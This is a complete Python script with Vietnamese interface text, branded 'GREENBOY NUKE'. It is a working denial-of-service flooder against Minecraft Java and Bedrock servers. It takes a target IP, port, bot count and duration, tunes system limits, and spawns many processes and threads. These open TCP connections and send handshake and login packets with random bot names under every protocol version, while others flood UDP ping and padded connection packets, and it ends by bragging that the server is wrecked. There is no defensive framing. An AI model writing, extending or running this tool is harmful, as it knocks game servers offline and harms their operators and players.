#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket, threading, time, sys, random, struct, os, multiprocessing, re

try:
    import resource
    resource.setrlimit(resource.RLIMIT_NOFILE, (2097152, 2097152))
    resource.setrlimit(resource.RLIMIT_NPROC, (2097152, 2097152))
except: pass

try:
    os.system('sysctl -w net.ipv4.tcp_tw_reuse=1 2>/dev/null')
    os.system('sysctl -w net.ipv4.ip_local_port_range="1024 65535" 2>/dev/null')
    os.system('sysctl -w net.core.somaxconn=65535 2>/dev/null')
    os.system('sysctl -w net.ipv4.tcp_max_syn_backlog=65535 2>/dev/null')
    os.system('sysctl -w net.core.netdev_max_backlog=65535 2>/dev/null')
except: pass

attack_flag = True
stats = {'sent': 0, 'failed': 0, 'bytes': 0}
stats_lock = threading.Lock()

# TẤT CẢ PROTOCOL MINECRAFT JAVA
JAVA_PROTOCOLS = [
    767, 766, 765, 764, 763, 762, 761, 760, 759, 758, 757, 756, 755,
    754, 753, 751, 736, 735, 578, 575, 573, 498, 490, 485, 480, 477,
    404, 401, 393, 340, 338, 335, 316, 315, 210, 110, 109, 107, 47, 5, 4
]

# TẤT CẢ PROTOCOL MINECRAFT BEDROCK
BEDROCK_PROTOCOLS = [
    686, 685, 680, 671, 662, 630, 622, 594, 589, 582, 575, 560, 554,
    544, 534, 527, 503, 486, 475, 471, 465, 448, 440, 431, 422, 419,
    408, 407, 390, 389, 388, 361, 354, 340, 332, 313, 291, 282, 274
]

class C:
    G='\033[92m'; R='\033[91m'; Y='\033[93m'; C='\033[96m'; M='\033[95m'; W='\033[97m'; B='\033[1m'; X='\033[0m'

def banner():
    print(f"""{C.R}{C.B}
   ██████╗ ██████╗ ███████╗███████╗███╗   ██╗██████╗  ██████╗ ██╗   ██╗
  ██╔════╝ ██╔══██╗██╔════╝██╔════╝████╗  ██║██╔══██╗██╔═══██╗╚██╗ ██╔╝
  ██║  ███╗██████╔╝█████╗  █████╗  ██╔██╗ ██║██████╔╝██║   ██║ ╚████╔╝ 
  ██║   ██║██╔══██╗██╔══╝  ██╔══╝  ██║╚██╗██║██╔══██╗██║   ██║  ╚██╔╝  
  ╚██████╔╝██║  ██║███████╗███████╗██║ ╚████║██████╔╝╚██████╔╝   ██║   
   ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝╚═════╝  ╚═════╝    ╚═╝   
{C.X}
{C.G}  ╔═══════════════════════════════════════════════════════╗
  ║     {C.R}☢ GREENBOY NUKE - FULL JAVA + BEDROCK ☢{C.G}             ║
  ║     {C.W}TẤT CẢ PHIÊN BẢN - TẤT CẢ PROTOCOL{C.G}                     ║
  ╚═══════════════════════════════════════════════════════╝{C.X}
""")

def clean(text, allow_dot=False):
    text = text.strip().replace(' ','').replace('\t','').replace('\n','').replace('\r','')
    text = text.replace('\u200b','').replace('\u200c','').replace('\u200d','').replace('\ufeff','').replace('\u00a0','')
    if allow_dot: text = re.sub(r'[^a-zA-Z0-9\.\-]', '', text)
    else: text = re.sub(r'[^0-9]', '', text)
    return text

def mkvar(v):
    if v < 128: return bytes([v])
    r = bytearray()
    while True:
        b = v & 0x7F; v >>= 7
        if v != 0: b |= 0x80
        r.append(b)
        if v == 0: break
    return bytes(r)

def mkstr(t): return mkvar(len(e:=t.encode())) + e

class JavaPC:
    def __init__(s, h, p):
        s.hs = mkstr(h); s.pb = struct.pack('>H', p); s.c = {}
        for pr in JAVA_PROTOCOLS:
            i = b'\x00' + mkvar(pr) + s.hs + s.pb
            s.c[f's_{pr}'] = mkvar(len(i)+1) + i + b'\x01'
            s.c[f'l_{pr}'] = mkvar(len(i)+1) + i + b'\x02'
        s.c['sr'] = b'\x01\x00'
    def gs(s, pr=None):
        if pr is None: pr = random.choice(JAVA_PROTOCOLS)
        return s.c.get(f's_{pr}', s.c[f's_{JAVA_PROTOCOLS[0]}'])
    def gl(s, pr=None):
        if pr is None: pr = random.choice(JAVA_PROTOCOLS)
        return s.c.get(f'l_{pr}', s.c[f'l_{JAVA_PROTOCOLS[0]}'])
    def gsr(s): return s.c['sr']
    def glp(s):
        n = f"GB{random.randint(0,99999999):08d}"
        return mkvar(len(n)+1) + b'\x00' + mkstr(n)

class BedrockPC:
    def __init__(s, h, p):
        s.host = h; s.port = p; s.hs = mkstr(h)
        s.c = {}
        for pr in BEDROCK_PROTOCOLS:
            # UNCONNECTED PING (0x01)
            ping = b'\x01' + struct.pack('>Q', random.randint(0, 2**63-1))
            ping += b'\x00' * 16 + b'\x00' * 8
            s.c[f'ping_{pr}'] = ping
            # OPEN CONNECTION REQUEST 1 (0x05)
            oq = b'\x05' + b'\x00' * 16 + struct.pack('B', pr % 256)
            oq += b'\x00' * random.randint(100, 1400)
            s.c[f'oq_{pr}'] = oq
    def gp(s, pr=None):
        if pr is None: pr = random.choice(BEDROCK_PROTOCOLS)
        return s.c.get(f'ping_{pr}', s.c[f'ping_{BEDROCK_PROTOCOLS[0]}'])
    def goq(s, pr=None):
        if pr is None: pr = random.choice(BEDROCK_PROTOCOLS)
        return s.c.get(f'oq_{pr}', s.c[f'oq_{BEDROCK_PROTOCOLS[0]}'])

class JavaAW:
    def __init__(s, h, p, d, pc): s.a = (h,p); s.e = time.time()+d; s.pc = pc
    def run(s):
        global attack_flag, stats
        while time.time() < s.e and attack_flag:
            b = 0
            for _ in range(200):
                if time.time() >= s.e or not attack_flag: break
                try:
                    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sk.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    sk.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
                    sk.settimeout(0.05); sk.connect(s.a)
                    pr = random.choice(JAVA_PROTOCOLS)
                    sk.sendall(s.pc.gs(pr) + s.pc.gsr())
                    sk.close(); b += 1
                except: pass
            with stats_lock: stats['sent'] += b; stats['bytes'] += b * 100

class JavaLW:
    def __init__(s, h, p, d, pc): s.a = (h,p); s.e = time.time()+d; s.pc = pc
    def run(s):
        global attack_flag, stats
        while time.time() < s.e and attack_flag:
            b = 0
            for _ in range(150):
                if time.time() >= s.e or not attack_flag: break
                try:
                    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sk.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    sk.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
                    sk.settimeout(0.08); sk.connect(s.a)
                    pr = random.choice(JAVA_PROTOCOLS)
                    sk.sendall(s.pc.gl(pr)); sk.sendall(s.pc.glp()); sk.close()
                    b += 1
                except: pass
            with stats_lock: stats['sent'] += b; stats['bytes'] += b * 150

class BedrockW:
    def __init__(s, h, p, d, pc): s.host = h; s.port = p; s.e = time.time()+d; s.pc = pc
    def run(s):
        global attack_flag, stats
        while time.time() < s.e and attack_flag:
            b = 0
            for _ in range(300):
                if time.time() >= s.e or not attack_flag: break
                try:
                    sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sk.settimeout(0.03)
                    pr = random.choice(BEDROCK_PROTOCOLS)
                    sk.sendto(s.pc.gp(pr), (s.host, s.port))
                    sk.sendto(s.pc.goq(pr), (s.host, s.port))
                    sk.close(); b += 1
                except: pass
            with stats_lock: stats['sent'] += b; stats['bytes'] += b * 200

def java_pw(h, p, d, pc, n, t):
    ws = []
    for _ in range(n):
        w = JavaAW(h,p,d,pc) if t=='s' else JavaLW(h,p,d,pc)
        th = threading.Thread(target=w.run); th.daemon = True; ws.append(th); th.start()
    for th in ws: th.join(timeout=1)

def bedrock_pw(h, p, d, pc, n):
    ws = []
    for _ in range(n):
        w = BedrockW(h,p,d,pc)
        th = threading.Thread(target=w.run); th.daemon = True; ws.append(th); th.start()
    for th in ws: th.join(timeout=1)

def main():
    global attack_flag, stats
    banner()
    
    while True:
        h = clean(input(f"{C.W}[?] IP: {C.G}"), allow_dot=True)
        if h and len(h) >= 3: break
        print(f"{C.R}[!] Nhập lại!{C.X}")
    try:
        rip = socket.gethostbyname(h)
        if rip != h: print(f"{C.G}[✓] {h} → {rip}{C.X}")
    except: print(f"{C.R}[!] Không phân giải được: {h}{C.X}"); sys.exit(1)
    
    while True:
        pi = clean(input(f"{C.W}[?] PORT: {C.G}"))
        if pi == '': p = 25565; print(f"{C.G}[✓] 25565{C.X}"); break
        try:
            p = int(pi)
            if 1 <= p <= 65535: break
            print(f"{C.R}[!] 1-65535!{C.X}")
        except: print(f"{C.R}[!] Số!{C.X}")
    
    print(f"\n{C.C}╔══════════════════════╗{C.X}")
    print(f"{C.C}║ {C.W}1. {C.G}JAVA   {C.W}2. {C.G}BEDROCK   {C.W}3. {C.R}BOTH{C.C} ║")
    print(f"{C.C}╚══════════════════════╝{C.X}")
    while True:
        pt = clean(input(f"{C.W}[?] PROTOCOL: {C.G}"))
        if pt in ['1','2','3']: proto = int(pt); break
        print(f"{C.R}[!] 1/2/3!{C.X}")
    
    while True:
        try:
            bc = int(clean(input(f"{C.W}[?] BOT: {C.G}")))
            if bc > 0: break
            print(f"{C.R}[!] >0!{C.X}")
        except: print(f"{C.R}[!] Số!{C.X}")
    
    while True:
        try:
            dr = int(clean(input(f"{C.W}[?] GIÂY: {C.G}")))
            if dr > 0: break
            print(f"{C.R}[!] >0!{C.X}")
        except: print(f"{C.R}[!] Số!{C.X}")
    
    pn = {1:'JAVA', 2:'BEDROCK', 3:'JAVA + BEDROCK'}
    print(f"\n{C.R}╔════════════════════════╗{C.X}")
    print(f"{C.R}║ {C.W}IP: {C.G}{h}:{p}{C.X}{C.R}        ║")
    print(f"{C.R}║ {C.W}PROTO: {C.G}{pn[proto]}{C.X}{C.R}      ║")
    print(f"{C.R}║ {C.W}BOT: {C.G}{bc} | GIÂY: {C.G}{dr}{C.X}{C.R}   ║")
    print(f"{C.R}╚════════════════════════╝{C.X}\n")
    
    if input(f"{C.R}{C.B}[☢] GÕ 'PHÁ': {C.G}").strip().upper() != 'PHÁ': print(f"{C.Y}HỦY!{C.X}"); sys.exit(0)
    
    print(f"\n{C.R}{C.B}☢ ĐANG PHÁ...{C.X}\n")
    
    cpu = multiprocessing.cpu_count()
    np = min(cpu*4, bc//20) if bc > 20 else 1
    if np < 1: np = 1
    wpp = bc // np
    
    st = time.time(); ps = []
    
    for i in range(np):
        if proto == 1:
            wt = 's' if i%2==0 else 'l'
            jpc = JavaPC(h, p)
            pr = multiprocessing.Process(target=java_pw, args=(h,p,dr,jpc,wpp,wt))
        elif proto == 2:
            bpc = BedrockPC(h, p)
            pr = multiprocessing.Process(target=bedrock_pw, args=(h,p,dr,bpc,wpp))
        else:
            if i < np//2:
                jpc = JavaPC(h, p)
                wt = 's' if i%2==0 else 'l'
                pr = multiprocessing.Process(target=java_pw, args=(h,p,dr,jpc,wpp,wt))
            else:
                bpc = BedrockPC(h, p)
                pr = multiprocessing.Process(target=bedrock_pw, args=(h,p,dr,bpc,wpp))
        pr.daemon = True; ps.append(pr); pr.start()
    
    try:
        ls = 0
        while time.time() - st < dr and attack_flag:
            time.sleep(1); el = time.time() - st
            with stats_lock: se = stats['sent']; fa = stats['failed']; mb = stats['bytes']/1024/1024
            cr = se - ls; ls = se
            bl = min(40, int(cr/2500))
            print(f"\r{C.R}[{el:.0f}s]{C.X} {C.Y}[{'█'*bl}{'░'*(40-bl)}]{C.X} {C.G}{se:,}{C.X} | {C.R}{fa:,}{C.X} | {C.M}{cr:,}{C.X}/s | {C.C}{mb:.1f}{C.X}MB   ", end='')
    except KeyboardInterrupt: print(f"\n{C.Y}DỪNG!{C.X}"); attack_flag = False
    
    attack_flag = False
    for pr in ps: pr.join(timeout=2)
    for pr in ps:
        if pr.is_alive(): pr.terminate()
    
    el = time.time() - st; fr = stats['sent']/el if el > 0 else 0
    print(f"\n\n{C.R}{C.B}╔════════════════════════╗{C.X}")
    print(f"{C.R}{C.B}║ ☢ KẾT THÚC ☢{C.X}{C.R}        ║")
    print(f"{C.R}{C.B}║ {C.W}IP: {C.G}{h}:{p}{C.X}{C.R}{C.B}        ║")
    print(f"{C.R}{C.B}║ {C.W}PROTO: {C.G}{pn[proto]}{C.X}{C.R}{C.B}      ║")
    print(f"{C.R}{C.B}║ {C.W}GÓI: {C.G}{stats['sent']:,}{C.X}{C.R}{C.B}         ║")
    print(f"{C.R}{C.B}║ {C.W}TỐC ĐỘ: {C.G}{fr:,.0f}/s{C.X}{C.R}{C.B}   ║")
    print(f"{C.R}{C.B}║ {C.W}MB: {C.G}{stats['bytes']/1024/1024:.1f}{C.X}{C.R}{C.B}        ║")
    print(f"{C.R}{C.B}╚════════════════════════╝{C.X}\n")
    if fr >= 10000: print(f"{C.R}{C.B}☢ SERVER BAY MÀU! ☢{C.X}\n")

if __name__ == "__main__":
    try: os.nice(-20)
    except: pass
    main()